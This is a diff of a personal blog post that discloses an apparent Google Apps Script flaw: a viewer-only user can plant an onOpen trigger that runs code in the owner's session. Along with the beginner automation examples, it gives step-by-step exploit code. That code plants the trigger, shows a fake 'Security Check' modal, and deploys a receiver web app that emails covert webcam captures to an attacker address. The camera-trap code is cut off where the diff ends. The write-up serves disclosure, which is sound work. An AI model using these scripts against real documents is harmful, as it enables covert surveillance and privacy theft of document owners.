@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read-only viewers unexpected power&hellip;.\nMillions of people around the world rely on Google Docs every single day, trusting the platform with everything from personal notes to highly confidential corporate data. To make these documents even more powerful, Google provides a tool called Google Apps Script—a cloud-based JavaScript platform designed to extend and automate Google Workspace applications.\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Hi team, this is my first write up. It will be a little long, but I have tried my best to keep it simple. I just want to make sure that anyone reading this can follow along and understand it well in a simple way.\nSo before I get into the bug I found, I want to briefly explain what Apps Script is.\nThink of Google Apps Script as a superpower for your favorite Google apps like Docs, Sheets, Gmail, and Drive. It is a lightweight beginner friendly coding platform that lets you write simple scripts to automate tasks, connect your apps together and build custom features. If you already know how to use Google Docs or Sheets. Apps Script is like an invisible assistant that can do your work for you in the background. The main goal of Apps Script is automation, making things happen automatically so you don&rsquo;t have to do them manually.\n">
 <title>The Silent Trigger: How Viewer Access Leads to UI Abuse in Google Workspace</title>
 
 
@@ -12,13 +12,13 @@
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
 
 
-<link rel="stylesheet" href="/scss/style.min.f400d48f3e3e2a9350f065827c85daf833c36a1b8d677470fc5b620e46201189.css"><meta property='og:title' content="The Silent Trigger: How Viewer Access Leads to UI Abuse in Google Workspace">
-<meta property='og:description' content="While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read-only viewers unexpected power&hellip;.\nMillions of people around the world rely on Google Docs every single day, trusting the platform with everything from personal notes to highly confidential corporate data. To make these documents even more powerful, Google provides a tool called Google Apps Script—a cloud-based JavaScript platform designed to extend and automate Google Workspace applications.\n">
+<link rel="stylesheet" href="/scss/style.min.2f88e2eb88a17c486bb156a513b54acd6117c68fbba3d4ba248212eb7302a015.css"><meta property='og:title' content="The Silent Trigger: How Viewer Access Leads to UI Abuse in Google Workspace">
+<meta property='og:description' content="Hi team, this is my first write up. It will be a little long, but I have tried my best to keep it simple. I just want to make sure that anyone reading this can follow along and understand it well in a simple way.\nSo before I get into the bug I found, I want to briefly explain what Apps Script is.\nThink of Google Apps Script as a superpower for your favorite Google apps like Docs, Sheets, Gmail, and Drive. It is a lightweight beginner friendly coding platform that lets you write simple scripts to automate tasks, connect your apps together and build custom features. If you already know how to use Google Docs or Sheets. Apps Script is like an invisible assistant that can do your work for you in the background. The main goal of Apps Script is automation, making things happen automatically so you don&rsquo;t have to do them manually.\n">
 <meta property='og:url' content='http://localhost:1313/posts/my-first-writeup/'>
 <meta property='og:site_name' content='Karthik Pillai | Blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:published_time' content='2026-05-14T11:49:38&#43;05:30'/><meta property='article:modified_time' content='2026-05-14T11:49:38&#43;05:30'/>
 <meta name="twitter:title" content="The Silent Trigger: How Viewer Access Leads to UI Abuse in Google Workspace">
-<meta name="twitter:description" content="While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read-only viewers unexpected power&hellip;.\nMillions of people around the world rely on Google Docs every single day, trusting the platform with everything from personal notes to highly confidential corporate data. To make these documents even more powerful, Google provides a tool called Google Apps Script—a cloud-based JavaScript platform designed to extend and automate Google Workspace applications.\n">
+<meta name="twitter:description" content="Hi team, this is my first write up. It will be a little long, but I have tried my best to keep it simple. I just want to make sure that anyone reading this can follow along and understand it well in a simple way.\nSo before I get into the bug I found, I want to briefly explain what Apps Script is.\nThink of Google Apps Script as a superpower for your favorite Google apps like Docs, Sheets, Gmail, and Drive. It is a lightweight beginner friendly coding platform that lets you write simple scripts to automate tasks, connect your apps together and build custom features. If you already know how to use Google Docs or Sheets. Apps Script is like an invisible assistant that can do your work for you in the background. The main goal of Apps Script is automation, making things happen automatically so you don&rsquo;t have to do them manually.\n">
     </head>
     <body class="
     article-page
@@ -84,14 +84,6 @@
             </a>
         </li>
         
-        
-        <li >
-            <a href='/share/' >
-                
-                <span>Share</span>
-            </a>
-        </li>
-        
         <li class="menu-bottom-section">
             <ol class="menu">
 
@@ -151,7 +143,7 @@
 
 
                     <time class="article-time--reading">
-                        7 minutes read
+                        11 minutes read
                     </time>
                 
             </div>
@@ -171,9 +163,64 @@
     <section class="article-content">
     
     
-    <p>While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read-only viewers unexpected power&hellip;.</p>
-<p>Millions of people around the world rely on Google Docs every single day, trusting the platform with everything from personal notes to highly confidential corporate data. To make these documents even more powerful, Google provides a tool called Google Apps Script—a cloud-based JavaScript platform designed to extend and automate Google Workspace applications.</p>
-<p>A core feature of this platform is the use of &ldquo;triggers.&rdquo; Think of triggers as automated tripwires; they are rules that tell a script to run automatically in the background whenever a specific event occurs. Users love to automate their workspaces to eliminate repetitive tasks. For example, you might use a trigger to:</p>
+    <p>Hi team, this is my first write up. It will be a little long, but I have tried my best to keep it simple. I just want to make sure that anyone reading this can follow along and understand it well in a simple way.</p>
+<p>So before I get into the bug I found, I want to briefly explain what Apps Script is.</p>
+<p>Think of Google Apps Script as a superpower for your favorite Google apps like Docs, Sheets, Gmail, and Drive. It is a lightweight beginner friendly coding platform that lets you write simple scripts to automate tasks, connect your apps together and build custom features. If you already know how to use Google Docs or Sheets. Apps Script is like an invisible assistant that can do your work for you in the background. The main goal of Apps Script is automation, making things happen automatically so you don&rsquo;t have to do them manually.</p>
+<p>Here are three simple examples so you can understand it more easily. We can do a lot more with Apps Script but I am just showing the basics here.</p>
+<h2 id="example-1-auto-inserting-text-into-a-google-doc">Example 1: Auto inserting text into a Google Doc
+</h2><p>Step 1: Open the Script Editor</p>
+<p>Inside any open Google Doc and click on Extensions in the top menu bar then select Apps Script. This opens a new web page where you write your automation instructions.</p>
+<p>Step 2: Write a simple script</p>
+<p>By default, you will see a blank area with a function skeleton. To make a simple automation that adds text to your document, type the following code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">insertWelcomingText</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 1. Open the current active document
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">DocumentApp</span>.<span style="color:#a6e22e">getActiveDocument</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 2. Access the main body of the text
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">doc</span>.<span style="color:#a6e22e">getBody</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 3. Automatically append a new paragraph
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendParagraph</span>(<span style="color:#e6db74">&#34;Hello readers! This text was generated automatically using Google Apps Script.&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Step 4: Grant permissions</p>
+<p>Apps Script is powerful, Google will show a pop up asking for your permission to let the script modify your document. You only need to grant this authorization once.</p>
+<p>Step 5: See the content</p>
+<p>Go back to your Google Doc tab. You will see that the sentence &ldquo;Hello readers! This text was generated automatically using Google Apps Script.&rdquo; has instantly appeared at the bottom of the page without you typing it.</p>
+<video width="100%" controls>
+  <source src="/videos/Example_1.mp4" type="video/mp4">
+</video>
+<p>So here:  It runs entirely in the cloud. You just need a web browser no software or compilers required. It uses JavaScript.If you find yourself doing the same copy paste routine every day, a 5 line script can often replace hours of manual work.</p>
+<h3 id="example-2-automated-document-customization">Example 2: Automated Document Customization
+</h3><p>Imagine a manager (the Owner) shares a Google Doc ID with an assistant (the Editor). The document is a massive, messy template filled with placeholder text like [CLIENT_NAME], [DATE], and [PRICE].</p>
+<p>Normally, a human would have to spend 15 minutes carefully reading through the whole document, finding every placeholder, and typing over them. It is tedious, boring, and easy to make a mistake.</p>
+<p>With Apps Script, the Editor can do this in 2 seconds using a simple &ldquo;Find and Replace&rdquo; automation.</p>
+<p>Step 1: The Shared Document
+The owner gives the editor a Document ID. Inside that document, there is text that looks like this.</p>
+<p>&ldquo;Dear [NAME], we are pleased to confirm your appointment on [DATE]. Please review your details.&rdquo;</p>
+<p>Step 2: The Editor&rsquo;s Automation Code</p>
+<p>The Editor opens the Apps Script editor and pastes this simple code. It instructs the script to find the shared ID, search for the brackets, and replace them with the actual information instantly.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">customizeSharedDocument</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 1. The ID of the shared document given by the owner
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sharedDocId</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1A2b3C4d5E6f7G8h9I0j&#34;</span>; 
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">DocumentApp</span>.<span style="color:#a6e22e">openById</span>(<span style="color:#a6e22e">sharedDocId</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">doc</span>.<span style="color:#a6e22e">getBody</span>();
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 2. The data that needs to go into the document
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">clientName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Alex Rivera&#34;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">appointmentDate</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;June 20, 2026&#34;</span>;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 3. The Magic: Automatically find and replace the placeholders
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">replaceText</span>(<span style="color:#e6db74">&#34;\\[NAME\\]&#34;</span>, <span style="color:#a6e22e">clientName</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">replaceText</span>(<span style="color:#e6db74">&#34;\\[DATE\\]&#34;</span>, <span style="color:#a6e22e">appointmentDate</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Step 3: Run and Done
+When the Editor clicks Run, the script sweeps through the entire document instantly.</p>
+<p>Every single place where [NAME] or [DATE] appeared is perfectly swapped out with &ldquo;Alex Rivera&rdquo; and &ldquo;June 20, 2026&rdquo;.</p>
+<p>so here: A tired employee might miss a placeholder on page 4 of a long document. The script never misses. If the manager suddenly says, &ldquo;Here are the IDs for 100 different client letters, please update all of them&rdquo;, a human would take days to finish. The Editor could easily modify this script to pull a list of 100 names and dates from a Google Sheet, loop through the document IDs, and customize all 100 files in under a minute.</p>
+<h2 id="moving-to-the-vulnerability">Moving to the Vulnerability
+</h2><p>Now that we understand how Apps Script handles automation and opens files using unique Document IDs let&rsquo;s look at the underlying security flaw I discovered.</p>
+<p>While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read only viewers unexpected power&hellip;.</p>
+<p>A core feature of this platform is the use of &ldquo;triggers.&rdquo; Think of triggers as automated tripwires, they are rules that tell a script to run automatically in the background whenever a specific event occurs. Users love to automate their workspaces to eliminate repetitive tasks. For example, you might use a trigger to:</p>
 <p>Automatically send an email alert the moment a specific document is modified.</p>
 <p>Generate and distribute a weekly PDF report every Friday at 5 PM.</p>
 <p>Instantly format or validate new data as it is entered.</p>
@@ -181,14 +228,14 @@
 </h2><p>Google&rsquo;s official documentation states clearly:</p>
 
     <blockquote>
-        <p><em>&ldquo;They don&rsquo;t run if a file is opened in read-only (view or comment) mode. For standalone scripts, users need at least view access to the script file for triggers to run properly.&rdquo;</em></p>
+        <p><em>&ldquo;They don&rsquo;t run if a file is opened in read only (view or comment) mode. For standalone scripts, users need at least view access to the script file for triggers to run properly.&rdquo;</em></p>
 
     </blockquote>
-<p>However, during my research, I observed a critical deviation from this rule. While it is true that the trigger won&rsquo;t run when the <em>Viewer</em> opens the file, the system fails to prevent the Viewer from <em>creating</em> the trigger in the first place. By binding an <code>onOpen</code> trigger to a specific Document ID, the read-only user can plant a trap. Because the trigger is tied to the document itself, it fires inside the <strong>owner&rsquo;s or editor&rsquo;s</strong> session the next time they open or refresh the file.</p>
-<p>The result: a low-privileged user forcing arbitrary code to execute in a high-privileged user&rsquo;s browser, entirely within the trusted <code>docs.google.com</code> domain.</p>
+<p>However, during my research, I observed a critical deviation from this rule. While it is true that the trigger won&rsquo;t run when the <em>Viewer</em> opens the file, the system fails to prevent the Viewer from <em>creating</em> the trigger in the first place. By binding an <code>onOpen</code> trigger to a specific Document ID, the read only user can plant a trap. Because the trigger is tied to the document itself, it fires inside the <strong>owner&rsquo;s or editor&rsquo;s</strong> session the next time they open or refresh the file.</p>
+<p>The result: a low privileged user forcing arbitrary code to execute in a high privileged user&rsquo;s browser, entirely within the trusted <code>docs.google.com</code> domain.</p>
 <hr>
 <h2 id="how-the-attack-works-setup">How the Attack Works (Setup)
-</h2><p>The attacker—operating with only Viewer access—needs nothing more than the document&rsquo;s ID. From a separate Apps Script project, they run this script once:</p>
+</h2><p>The attacker operating with only Viewer access needs nothing more than the document&rsquo;s ID. From a separate Apps Script project, they run this script once.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">myFunction</span>() {
 </span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Clean up any old triggers
 </span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">getProjectTriggers</span>().<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">trigger</span> =&gt;
@@ -202,9 +249,12 @@
 </span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">create</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>From this point on, every time the document owner or editor refreshes the file, <code>formTriggerRan()</code> executes silently in their session.</p>
+<video width="100%" controls>
+  <source src="/videos/Example_2.mp4" type="video/mp4">
+</video>
 <hr>
 <h2 id="scenario-1--basic-proof-of-concept">Scenario 1 — Basic Proof of Concept
-</h2><p>The simplest payload: a modal alert that pops up in the owner&rsquo;s browser.</p>
+</h2><p>The simplest payload. A modal alert that pops up in the owner&rsquo;s browser.</p>
 <p>Steps to Reproduce</p>
 <ol>
 <li>
@@ -214,7 +264,7 @@
 <p>The attacker opens the document and copies the Document ID from the URL (the long alphanumeric string between /d/ and /edit).</p>
 </li>
 <li>
-<p>The attacker opens a separate, standalone Google Apps Script project (not the one attached to the document) and pastes the exploit code below, inserting the victim&rsquo;s Document ID.</p>
+<p>The attacker opens a separate, standalone Google Apps Script project and pastes the exploit code below, inserting the victim&rsquo;s Document ID.</p>
 </li>
 <li>
 <p>The attacker manually runs myFunction(). Despite only having Viewer access to the target document, the Apps Script engine successfully creates the onOpen trigger without any error.</p>
@@ -277,53 +327,99 @@
 <hr>
 <h2 id="scenario-3--covert-camera-exfiltration">Scenario 3 — Covert Camera Exfiltration
 </h2><p>This is where it escalates into a serious privacy breach.</p>
-<p>The attacker sets up a two-part system:</p>
+<p>How It Works</p>
+<p>The attacker (with only viewer access) sets up a two part system using Google Apps Script:</p>
 <ol>
-<li>A <strong>Web App</strong> (their own Apps Script project) that receives captured images by email.</li>
-<li>A <strong>camera trap HTML file</strong> delivered via the trigger as a modal titled &ldquo;Security Check.&rdquo;</li>
+<li>A receiver web app — deployed by the attacker to collect captured images via email.</li>
+<li>A camera trap — an HTML file delivered through the onOpen trigger as a modal titled    &ldquo;Security Check.&rdquo;</li>
 </ol>
-<p>When the owner refreshes the page, a popup appears natively within Google Docs requesting camera and video permissions. Crucially, the script can only capture photos if the user explicitly enables this camera access. If the owner clicks &ldquo;Allow&rdquo; (or if they have previously granted camera permissions to Google Docs, in which case it won&rsquo;t even ask), the exploit proceeds.Once permission is granted, their front camera is covertly activated.
-The script then captures photos of the owner every five seconds and sends them to an attacker controlled email address or domain. The attacker can continuously receive and view these images.</p>
-<p><strong>The receiver (attacker&rsquo;s web app):</strong></p>
+<p>When the document owner refreshes the page, a popup appears natively within Google Docs requesting camera permissions. If the owner clicks Allow or has previously granted camera permissions to Google Docs, in which case no prompt appears at all, the exploit proceeds silently. The front camera is activated, and photos are captured every 15 seconds and sent to the attacker&rsquo;s email.</p>
+<p>Steps to Reproduce</p>
+<ol>
+<li>
+<p>Setup
+The attacker obtains the document ID from their viewer access, then opens Apps Script and creates three files.</p>
+</li>
+<li>
+<p>The Receiver (Attacker&rsquo;s Web App)
+This receives the captured images and forwards them as email attachments.</p>
+</li>
+</ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">doPost</span>(<span style="color:#a6e22e">e</span>) {
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">base64Data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">parameter</span>.<span style="color:#a6e22e">image</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/^data:image\/[a-z]+;base64,/</span>, <span style="color:#e6db74">&#39;&#39;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">imageBlob</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Utilities</span>.<span style="color:#a6e22e">newBlob</span>(
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Utilities</span>.<span style="color:#a6e22e">base64Decode</span>(<span style="color:#a6e22e">base64Data</span>), <span style="color:#e6db74">&#39;image/jpeg&#39;</span>, <span style="color:#e6db74">&#39;capture.jpg&#39;</span>
-</span></span><span style="display:flex;"><span>  );
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">imageBlob</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">parameter</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;unknown&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">time</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">parameter</span>.<span style="color:#a6e22e">time</span> <span style="color:#f92672">||</span> <span style="color:#66d9ef">new</span> Date().<span style="color:#a6e22e">toISOString</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GmailApp</span>.<span style="color:#a6e22e">sendEmail</span>(
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;attacker@email.com&#39;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">`Webcam Capture: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">parameter</span>.<span style="color:#a6e22e">user</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Captured image attached.&#39;</span>,
-</span></span><span style="display:flex;"><span>    { <span style="color:#a6e22e">attachments</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">imageBlob</span>] }
-</span></span><span style="display:flex;"><span>  );
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">parameter</span>.<span style="color:#a6e22e">image</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">base64Data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">parameter</span>.<span style="color:#a6e22e">image</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/^data:image\/[a-z]+;base64,/</span>, <span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">imageBlob</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Utilities</span>.<span style="color:#a6e22e">newBlob</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Utilities</span>.<span style="color:#a6e22e">base64Decode</span>(<span style="color:#a6e22e">base64Data</span>), <span style="color:#e6db74">&#39;image/jpeg&#39;</span>, <span style="color:#e6db74">&#39;capture.jpg&#39;</span>
+</span></span><span style="display:flex;"><span>      );
+</span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ContentService</span>.<span style="color:#a6e22e">createTextOutput</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">status</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;OK&#39;</span> }))
-</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">setMimeType</span>(<span style="color:#a6e22e">ContentService</span>.<span style="color:#a6e22e">MimeType</span>.<span style="color:#a6e22e">JSON</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">subject</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`Webcam Capture: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">user</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`User: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">user</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\nTime: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">time</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">imageBlob</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">attachments</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">imageBlob</span>.<span style="color:#a6e22e">setName</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">user</span><span style="color:#e6db74">}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">${</span>Date.<span style="color:#a6e22e">now</span>()<span style="color:#e6db74">}</span><span style="color:#e6db74">.jpg`</span>)];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">GmailApp</span>.<span style="color:#a6e22e">sendEmail</span>(<span style="color:#e6db74">&#39;attacker@email.com&#39;</span>, <span style="color:#a6e22e">subject</span>, <span style="color:#a6e22e">body</span>, <span style="color:#a6e22e">options</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ContentService</span>
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">createTextOutput</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">status</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;OK&#39;</span> }))
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">setMimeType</span>(<span style="color:#a6e22e">ContentService</span>.<span style="color:#a6e22e">MimeType</span>.<span style="color:#a6e22e">JSON</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ContentService</span>
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">createTextOutput</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">toString</span>() }))
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">setMimeType</span>(<span style="color:#a6e22e">ContentService</span>.<span style="color:#a6e22e">MimeType</span>.<span style="color:#a6e22e">JSON</span>);
+</span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><strong>The camera trap (runs in the owner&rsquo;s browser):</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">stream</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">mediaDevices</span>.<span style="color:#a6e22e">getUserMedia</span>({ <span style="color:#a6e22e">video</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">audio</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> });
+</span></span></code></pre></div><p>This is deployed as a Web App: Execute as: Me | Access: Anyone. The resulting URL is used in the next two files.</p>
+<ol start="3">
+<li>The Trigger
+This sets an onOpen trigger on the victim&rsquo;s document. When the owner opens or refreshes the document, it launches the camera trap as a modal dialog.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">javascriptfunction</span> <span style="color:#a6e22e">formTriggerRan</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">HtmlService</span>.<span style="color:#a6e22e">createHtmlOutputFromFile</span>(<span style="color:#e6db74">&#39;camera&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">setWidth</span>(<span style="color:#ae81ff">450</span>).<span style="color:#a6e22e">setHeight</span>(<span style="color:#ae81ff">400</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DocumentApp</span>.<span style="color:#a6e22e">getUi</span>().<span style="color:#a6e22e">showModalDialog</span>(<span style="color:#a6e22e">html</span>, <span style="color:#e6db74">&#39;Security Check&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">myFunction</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">getProjectTriggers</span>().<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">trigger</span> =&gt; <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">deleteTrigger</span>(<span style="color:#a6e22e">trigger</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">newTrigger</span>(<span style="color:#e6db74">&#39;formTriggerRan&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">forDocument</span>(<span style="color:#e6db74">&#39;DOCUMENT_ID_HERE&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">onOpen</span>()
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">create</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ol start="4">
+<li>The Camera Trap
+Runs in the owner&rsquo;s browser inside the modal. Requests camera access, then silently exfiltrates a photo every 15 seconds.</li>
+</ol>
